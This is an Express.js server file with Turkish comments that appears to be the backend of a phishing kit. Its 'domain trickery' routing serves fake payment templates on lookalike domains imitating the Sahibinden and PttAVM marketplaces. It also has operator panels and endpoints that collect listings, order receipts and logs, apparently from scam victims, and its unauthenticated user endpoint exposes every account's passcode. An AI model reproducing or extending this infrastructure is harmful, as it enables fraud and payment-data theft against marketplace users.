require('dotenv').config();
const express = require('express');
const cors = require('cors'); 
const fs = require('fs'); // Şablonları okumak için eklendi
const path = require('path'); // Dosya yollarını bulmak için eklendi
const { initializeApp } = require('firebase/app');
const {
    getFirestore, collection, addDoc, getDocs, 
    doc, getDoc, query, where, 
    updateDoc, deleteDoc 
} = require('firebase/firestore');

const app = express();
app.use(cors()); 
app.use(express.json()); 

// --- KASA BAĞLANTISI ---
const firebaseConfig = {
    apiKey: process.env.FIREBASE_API_KEY,
    authDomain: process.env.FIREBASE_AUTH_DOMAIN,
    projectId: process.env.FIREBASE_PROJECT_ID,
    storageBucket: process.env.FIREBASE_STORAGE_BUCKET,
    messagingSenderId: process.env.FIREBASE_MESSAGING_SENDER_ID,
    appId: process.env.FIREBASE_APP_ID
};

const firebaseApp = initializeApp(firebaseConfig);
const db = getFirestore(firebaseApp);

// --- API KAPILARI (Mevcut Sisteminiz Dokunulmadan Bırakıldı) ---

app.post('/api/login', async (req, res) => {
    const { code } = req.body; 
    try {
        const q = query(collection(db, "users"), where("passcode", "==", code));
        const querySnapshot = await getDocs(q);
        
        if (querySnapshot.empty) {
            return res.status(401).json({ success: false, message: "Geçersiz erişim kodu!" });
        }
        
        const userDoc = querySnapshot.docs[0];
        res.json({ success: true, user: { id: userDoc.id, ...userDoc.data() } });
        } catch (e) {
        console.error("FIREBASE GİRİŞ HATASI DETAYI:", e); 
        res.status(500).json({ success: false, message: "Sunucu hatası" });
    }
});

// --- İLAN YÖNETİMİ ---
app.get('/api/ilanlar-getir', async (req, res) => {
    const { userId } = req.query;
    const q = query(collection(db, "ilanlar"), where("olusturanMusteri", "==", userId));
    const snap = await getDocs(q);
    res.json(snap.docs.map(doc => ({ docId: doc.id, ...doc.data() })));
});

app.post('/api/ilan-ekle', async (req, res) => {
    const docRef = await addDoc(collection(db, "ilanlar"), req.body);
    res.json({ success: true, id: docRef.id });
});

app.delete('/api/ilan-sil/:id', async (req, res) => {
    await deleteDoc(doc(db, "ilanlar", req.params.id));
    res.json({ success: true });
});

// --- DEKONT VE LOG ---
app.get('/api/dekontlar-getir', async (req, res) => {
    const q = query(collection(db, "dekontlar"), where("saticiId", "==", req.query.userId));
    const snap = await getDocs(q);
    res.json(snap.docs.map(doc => doc.data()));
});

app.get('/api/logs-getir', async (req, res) => {
    const q = query(collection(db, "logs"), where("saticiId", "==", req.query.userId));
    const snap = await getDocs(q);
    res.json(snap.docs.map(doc => doc.data()));
});

// --- 1. İLAN GETİRME KAPISI (GET) ---
app.get('/api/ilan/:id', async (req, res) => {
    try {
        const ilanRef = doc(db, "ilanlar", req.params.id);
        const ilanSnap = await getDoc(ilanRef);
        if (ilanSnap.exists()) {
            res.json(ilanSnap.data());
        } else {
            res.status(404).json({ hata: "İlan yok" });
        }
    } catch (error) {
        res.status(500).json({ hata: "Sunucu hatası" });
    }
});

// --- MÜŞTERİ YÖNETİMİ KAPILARI ---
app.get('/api/users', async (req, res) => {
    try {
        const q = query(collection(db, "users"));
        const snapshot = await getDocs(q);
        const users = snapshot.docs.map(doc => ({ docId: doc.id, ...doc.data() }));
        res.json(users);
    } catch (error) {
        res.status(500).json({ hata: "Müşteriler getirilemedi" });
    }
});

app.post('/api/users/ekle', async (req, res) => {
    try {
        const yeniMusteri = req.body;
        const docRef = await addDoc(collection(db, "users"), {
            ...yeniMusteri,
            createdAt: new Date().getTime(),
            isActive: true
        });
        res.json({ success: true, id: docRef.id });
    } catch (error) {
        res.status(500).json({ hata: "Ekleme başarısız" });
    }
});

app.patch('/api/users/guncelle/:id', async (req, res) => {
    try {
        const userRef = doc(db, "users", req.params.id);
        await updateDoc(userRef, req.body);
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ hata: "Güncelleme başarısız" });
    }
});

app.patch('/api/ilan-guncelle/:id', async (req, res) => {
    try {
        await updateDoc(doc(db, "ilanlar", req.params.id), req.body);
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ hata: "Güncelleme başarısız" });
    }
});

// --- 2. LOG TUTMA KAPISI (POST) ---
app.post('/api/log-ekle', async (req, res) => {
    try {
        const yeniLog = req.body;
        await addDoc(collection(db, "logs"), {
            ...yeniLog,
            timestamp: new Date().getTime()
        });
        res.json({ durum: "başarılı" });
    } catch (error) {
        res.status(500).json({ hata: "Log kaydedilemedi" });
    }
});

// --- 3. SİPARİŞ/DEKONT KAPISI (POST) ---
app.post('/api/siparis-tamamla', async (req, res) => {
    try {
        const siparisVerisi = req.body;
        await addDoc(collection(db, "dekontlar"), siparisVerisi);
        res.json({ durum: "başarılı" });
    } catch (error) {
        res.status(500).json({ hata: "Sipariş alınamadı" });
    }
});


// ==========================================================
// --- DOMAIN HOKKABAZLIĞI: ŞABLON VE SAYFA YÖNLENDİRMESİ ---
// ==========================================================

// API olmayan diğer bütün adres isteklerini burada yakalıyoruz
app.get('*', (req, res) => {
    // Eğer istek /api/ ile başlıyorsa ama üstteki kapılara uymadıysa, hata dön.
    // Bu sayede API istekleri yanlışlıkla HTML sayfalarına yönlenmez.
    if (req.path.startsWith('/api/')) {
        return res.status(404).json({ hata: "Böyle bir API ucu bulunamadı" });
    }

    const host = req.headers.host || '';
    const rootDir = process.cwd();

    try {
        // 1. Panellere Direkt Erişim Kontrolü
        // (Eğer URL'ye sonuna /god-panel veya /musteri-panel yazılırsa direkt o HTML'leri aç)
        if (req.path === '/god-panel' || req.path === '/god-panel.html') {
            const html = fs.readFileSync(path.join(rootDir, 'god-panel.html'), 'utf8');
            return res.status(200).setHeader('Content-Type', 'text/html').send(html);
        }
        
        if (req.path === '/musteri-panel' || req.path === '/musteri-panel.html') {
            const html = fs.readFileSync(path.join(rootDir, 'musteri-panel.html'), 'utf8');
            return res.status(200).setHeader('Content-Type', 'text/html').send(html);
        }

        // 2. Domain Bazlı Şablon Yönlendirmeleri
        if (host.includes('payislemlerim-sahilinden') || host.includes('payislemlerim-sahibinden')) {
            // Şablon 1 (Sahilinden)
            const html = fs.readFileSync(path.join(rootDir, 'sablon1.html'), 'utf8');
            return res.status(200).setHeader('Content-Type', 'text/html').send(html);
        } 
        else if (host.includes('payislemlerim-pttavm')) {
            // Şablon 2 (PttAVM)
            const html = fs.readFileSync(path.join(rootDir, 'sablon2.html'), 'utf8');
            return res.status(200).setHeader('Content-Type', 'text/html').send(html);
        } 
        else {
            // Hiçbiri değilse (Örn: ana domaine girildiyse) varsayılan index.html açılsın
            const html = fs.readFileSync(path.join(rootDir, 'index.html'), 'utf8');
            return res.status(200).setHeader('Content-Type', 'text/html').send(html);
        }

    } catch (error) {
        console.error("Şablon yükleme hatası:", error);
        return res.status(500).send("<h1>Sistem Hatası: Sayfa yüklenemedi. Dosya eksik olabilir.</h1>");
    }
});


// --- SUNUCU BAŞLATMA ---
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Santral ${PORT} portunda aktif!`));

// Vercel Serverless yapısı için Express'i dışarı aktarıyoruz
module.exports = app;
